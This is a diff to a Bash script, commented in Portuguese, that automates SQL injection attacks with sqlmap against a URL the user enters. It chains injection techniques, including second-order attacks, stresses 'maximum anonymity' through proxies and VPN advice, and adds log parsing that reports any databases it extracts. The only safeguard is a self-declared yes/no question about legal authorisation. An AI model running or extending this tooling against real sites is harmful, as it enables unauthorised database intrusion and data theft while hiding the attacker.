@@ -2,10 +2,20 @@
 # SQL Injection Automation Script
 # Foco: Máximo anonimato, logs, relatórios, integração com Kali e scripts do repositório
 
-RESULT_DIR="$(dirname "$0")/result"
+# Garante diretórios antes de qualquer uso
+BASE_DIR="$(dirname \"$(realpath \"$0\")\")"
+RESULT_DIR="$BASE_DIR/result"
 LOG_DIR="$RESULT_DIR/logs"
 RELATORIO_DIR="$RESULT_DIR/relatorio"
 RELATORIO_FILE="$RELATORIO_DIR/relatorio_$(date +%Y%m%d_%H%M%S).txt"
+
+mkdir -p "$RESULT_DIR" "$LOG_DIR" "$RELATORIO_DIR"
+
+# Checa se sqlmap está instalado
+command -v sqlmap >/dev/null 2>&1 || {
+   echo "[ERRO] sqlmap não encontrado no sistema." | tee -a "$LOG_DIR/error.log"
+   exit 1
+}
 
 # Função para checar root
 check_root() {
@@ -33,6 +43,10 @@ opsec_check() {
     echo "[OPSEC] Recomenda-se uso de VPN antes de iniciar o ataque." | tee -a "$LOG_DIR/opsec.log"
 }
 
+# Checagens essenciais ANTES de qualquer input
+check_root
+opsec_check
+
 # Pergunta sobre autorização legal
 read -p "Você tem autorização legal para realizar este teste? (s/n): " AUTORIZACAO
 if [[ ! "$AUTORIZACAO" =~ ^[sS]$ ]]; then
@@ -44,16 +58,13 @@ fi
 read -p "Digite o nome do operador: " OPERADOR
 
 # Salva informações iniciais no relatório
-mkdir -p "$RELATORIO_DIR"
-echo "Relatório de SQL Injection" > "$RELATORIO_FILE"
-echo "Data: $(date)" >> "$RELATORIO_FILE"
-echo "Operador: $OPERADOR" >> "$RELATORIO_FILE"
-echo "Autorização legal: SIM" >> "$RELATORIO_FILE"
-echo "----------------------------------------" >> "$RELATORIO_FILE"
-
-# Checagens iniciais
-check_root
-opsec_check
+{
+echo "Relatório de SQL Injection"
+echo "Data: $(date)"
+echo "Operador: $OPERADOR"
+echo "Autorização legal: SIM"
+echo "----------------------------------------"
+} > "$RELATORIO_FILE"
 
 # Função para executar sqlmap
 run_sqlmap() {
@@ -62,20 +73,38 @@ run_sqlmap() {
     local extra="$3"
     local log="$LOG_DIR/sqlmap_${mode}.log"
     echo "[+] Rodando sqlmap ($mode) em $url" | tee -a "$RELATORIO_FILE"
-    $PROXY sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
+    if [ -z "$PROXY" ]; then
+        echo "[AVISO] PROXY desativado." | tee -a "$LOG_DIR/opsec.log"
+        sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
+    else
+        $PROXY sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
+    fi
+    if grep -iq "available databases" "$log"; then
+        echo "[SUCESSO] $mode: Bancos de dados encontrados!" | tee -a "$RELATORIO_FILE"
+        grep -i "available databases" -A 10 "$log" | tee -a "$RELATORIO_FILE"
+    elif grep -iq "not injectable" "$log"; then
+        echo "[FALHA] $mode: Não injetável." | tee -a "$RELATORIO_FILE"
+    else
+        echo "[INFO] $mode: Verifique o log para detalhes." | tee -a "$RELATORIO_FILE"
+    fi
 }
 
 # Função para executar outros scripts do repositório (exemplo)
 run_custom_scripts() {
-    # Exemplo: rodar script customizado se existir
-    if [ -f "../Ferramentas/SQLCustomTool/sql_custom.sh" ]; then
+    CUSTOM="$BASE_DIR/../Ferramentas/SQLCustomTool/sql_custom.sh"
+    if [ -f "$CUSTOM" ]; then
         echo "[+] Rodando SQLCustomTool" | tee -a "$RELATORIO_FILE"
-        $PROXY bash ../Ferramentas/SQLCustomTool/sql_custom.sh | tee -a "$LOG_DIR/sqlcustom.log"
+        if [ -z "$PROXY" ]; then
+            bash "$CUSTOM" | tee -a "$LOG_DIR/sqlcustom.log"
+        else
+            $PROXY bash "$CUSTOM" | tee -a "$LOG_DIR/sqlcustom.log"
+        fi
     fi
 }
 
 # Entrada do alvo
 read -p "Digite a URL vulnerável para testar SQLi: " TARGET_URL
+TARGET_URL=$(echo "$TARGET_URL" | xargs)
 if [[ -z "$TARGET_URL" ]]; then
     echo "[ERRO] URL inválida." | tee -a "$LOG_DIR/error.log"
     exit 1
@@ -110,6 +139,7 @@ for t in $TECNICAS; do
             ;;
         6)
             read -p "Digite a URL de segunda ordem (ou deixe vazio): " SECOND_URL
+            SECOND_URL=$(echo "$SECOND_URL" | xargs)
             if [ -n "$SECOND_URL" ]; then
                 run_sqlmap "$TARGET_URL" "second-order" "--second-order=$SECOND_URL"
             else
